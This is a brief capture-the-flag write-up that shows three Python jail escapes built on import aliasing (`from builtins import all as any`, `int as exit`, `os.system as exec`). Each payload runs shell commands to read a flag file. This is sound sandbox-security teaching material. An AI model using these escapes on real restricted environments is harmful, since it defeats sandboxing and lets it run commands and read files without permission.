Couple of fun exploits here, based around the idea that `from x import y as z` will overwrite the variable `z` with the value `y`.

Overwriting the check for non-letter chars:
```py
from builtins import all as any
from os import system; system("cat flag.txt")
```

Overwriting the exit:
```py
from builtins import int as exit
from os import system; system("cat flag.txt")
```
Likely many functions work instead of int - anything that takes one number argument and doesn't error.

Overwriting exec:
```py
from os import system as exec
sh
cat flag.txt
```